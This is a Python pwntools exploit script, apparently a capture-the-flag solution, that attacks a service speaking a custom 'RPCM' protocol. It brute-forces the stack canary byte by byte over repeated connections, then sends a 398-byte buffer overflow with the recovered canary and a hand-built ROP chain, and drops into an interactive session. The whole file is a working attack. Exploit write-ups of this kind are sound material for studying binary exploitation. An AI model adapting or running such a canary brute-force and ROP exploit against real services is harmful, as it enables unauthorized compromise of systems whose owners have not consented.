#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import os
import struct
import sys
import IPython

elfPath = "./main"
libcPath = "./libc.so.6"
#  remoteAddr = "172.16.5.103"
remoteAddr = "localhost"
remotePort = 1337

context.binary = elfPath
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = context.binary

success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(bps = [], pie = False):
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(pidof(io)[0])).readlines()[1], 16)
        cmd = ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd = ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

p = lambda d: struct.pack(">i", d)
def brute(c):
    io = remote(remoteAddr, remotePort)
    io.send("RPCM")
    io.send(p(90))
    io.send(p(1))
    io.recvn(20)

    io.send("RPCM")
    io.send(p(10))
    io.send(p(3))
    io.send(p(90))
    io.send(p(0))

    io.send(p(4))
    io.send(p(90))

    io.send(p(398 + len(c)))
    io.send('=' * 398 + c)

    try:
        recv = io.recvn(4)
        if recv != "RPCN":
            #IPython.embed()
            print "???"
            io.close()
            return False
    except:
        io.close()
        return False

    print "Found one byte"
    io.close()
    return True



if __name__ == "__main__":
    #  canary = "0078af08acab00b2".decode("hex")
    canary = '\x00'
    #  canary = '0046fe17aea1ff32'.decode('hex')
    while len(canary) < 8:
        for c in range(0, 256):
            if c == 47:
                continue
            else:
                if brute(canary + chr(c)):
                    canary += chr(c)
                    break
        else:
            log.error("We're doomed!")

    log.info(canary.encode('hex'))

    io = remote(remoteAddr, remotePort)
    io.send("RPCM")
    io.send(p(90))
    io.send(p(1))
    io.recvn(20)

    io.send("RPCM")
    io.send(p(10))
    io.send(p(3))
    io.send(p(90))
    io.send(p(0))

    io.send(p(4))
    io.send(p(90))

    payload = '=' * 398 + canary + '00000000'
    #rop = p64(0x00000000004048f3) + p64(4) + p64(0x00000000004048f1) + p64(0x607A60) * 2 + p64(elf.plt['write'])
    #rop = p64(0x4048f3) + p64(4) + p64(0x401946)
    rop = p64(0x4048EA) + p64(0) + p64(0) + p64(0x607068) + p64(0x100) + p64(0x607A60) + p64(4) + p64(0x4048D0)
    payload += rop
    assert '/' not in payload
    io.send(p(len(payload)))
    io.send(payload)

    io.interactive()

